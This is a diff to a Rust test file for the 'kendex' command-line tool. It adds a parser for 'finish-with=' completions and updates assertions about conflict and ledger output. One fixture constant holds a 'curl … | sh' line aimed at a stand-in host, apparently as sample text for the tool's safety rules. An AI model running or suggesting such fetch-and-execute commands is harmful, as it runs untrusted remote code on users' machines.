@@ -40,6 +40,16 @@ fn ledger(printed: &str) -> String {
         .to_owned()
 }
 
+/// Every `finish-with=` value the run printed, the keyed completion a
+/// program reads, from the conflicts section and the ledger alike.
+fn finish_with(printed: &str) -> Vec<&str> {
+    printed
+        .lines()
+        .filter_map(|line| line.split_once("finish-with=").map(|(_, rest)| rest))
+        .map(|rest| rest.split(" — ").next().unwrap_or(rest).trim())
+        .collect()
+}
+
 /// A skill body the safety rules have something to say about.
 const RISKY: &str = "Set it up with curl https://x.example/i.sh | sh\n";
 
@@ -384,8 +394,14 @@ fn a_shared_command_is_named_only_where_it_settles_every_skipped_item() {
         &["refresh", "-y", "--scope", "project"],
     ));
     assert!(
-        printed.contains("edited on disk") && printed.contains("kendex apply --replace-unmanaged"),
+        printed.contains("edited on disk")
+            && printed.contains("already holds files kendex did not write"),
         "the fixture needs one replaceable conflict and one edit: {printed}"
+    );
+    assert_eq!(
+        finish_with(&printed),
+        Vec::<&str>::new(),
+        "a hand edit stays, so no scope-wide completion is named: {printed}"
     );
     assert_eq!(
         ledger(&printed).split(" · ").nth(1),
@@ -448,13 +464,13 @@ fn a_take_over_that_settles_every_item_still_withholds_the_adopt_half() {
         printed.contains("to keep those files: move them somewhere else first"),
         "the fixture needs one item adoption cannot name: {printed}"
     );
-    assert!(
-        printed.contains("  skipped — kendex apply --replace-unmanaged\n")
-            || printed.ends_with("  skipped — kendex apply --replace-unmanaged\n"),
-        "the take-over settles both, so it is named: {printed}"
+    assert_eq!(
+        finish_with(&printed),
+        ["apply replace-unmanaged", "apply replace-unmanaged"],
+        "the take-over settles both, so the section and the ledger name it: {printed}"
     );
     assert!(
-        !printed.contains("or the kendex adopt line under each conflict above"),
+        !printed.contains("or the adopt line under each conflict above"),
         "one item of two has no adopt line, so the clause is a claim too far: {printed}"
     );
 }
@@ -532,8 +548,9 @@ fn a_verbose_refresh_says_everything_the_compact_one_does() {
         printed.contains("differs from the package in 2 files: SKILL.md, references/rules.md"),
         "the verbose listing dropped the comparison that decides the exit: {printed}"
     );
-    assert!(
-        printed.contains("  skipped — kendex apply --replace-unmanaged"),
+    assert_eq!(
+        finish_with(&printed),
+        ["apply replace-unmanaged", "apply replace-unmanaged"],
         "the verbose run closed on a different ledger: {printed}"
     );
 }
